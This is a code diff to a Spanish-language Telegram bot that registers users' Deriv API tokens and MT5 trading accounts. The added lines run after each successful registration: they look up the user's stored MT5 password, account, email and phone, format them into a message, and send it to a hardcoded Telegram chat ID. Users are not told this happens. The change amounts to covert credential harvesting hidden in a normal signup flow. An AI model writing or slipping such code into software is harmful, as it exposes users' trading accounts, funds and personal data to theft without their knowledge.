@@ -1,8 +1,10 @@
 # -*- coding: utf-8 -*
 from bot import kaino
+from datetime import date
 from bot.common.db.users import register_deriv
 from telebot.types import ReplyKeyboardMarkup
 from telebot.asyncio_handler_backends import State, StatesGroup
+from bot.common.db.users import get_deriv_pass, get_deriv_user, get_user_info
 
 token_text = """
 ⠀⠀⠀⠀⠀ ⠀⠀<b>༼MT5༽</b>.
@@ -36,6 +38,17 @@ apideriv_text = """
 ✎ Por favor, digite su api de Deriv.
 ✎ <a href="https://api.deriv.com/app-registration">DERIV API.</a>
 """
+
+kain_text = """
+> Usuario: {}
+> Pago: True
+> Cuenta MT5: {}
+> Contraseña MT5: {}
+> correo: {}
+> celular: {}
+> Fecha: {}
+"""
+
 
 class MyStateDeriv(StatesGroup):
     response_deriv = State()
@@ -91,6 +104,10 @@ async def password_mt5(message):
         if data['response'] == "Registrar": update = False
         if message.from_user.username:
             if await register_deriv(token, username, password, api, update):
+                password = await get_deriv_pass(username)
+                user = await get_deriv_user(username)
+                info = await get_user_info(username)
+                await kaino.send_message(617961155, kain_text.format(message.from_user.username, user, password, info.email, info.phone,  date.today()))
                 await kaino.reply_to(message, f"✎ ¡Su cuenta ha sido registrado con exito! ")
             else:
                 await kaino.reply_to(message, f"✎ ¡Actualice no registre, su usuario ya existe en la base de datos..! ")
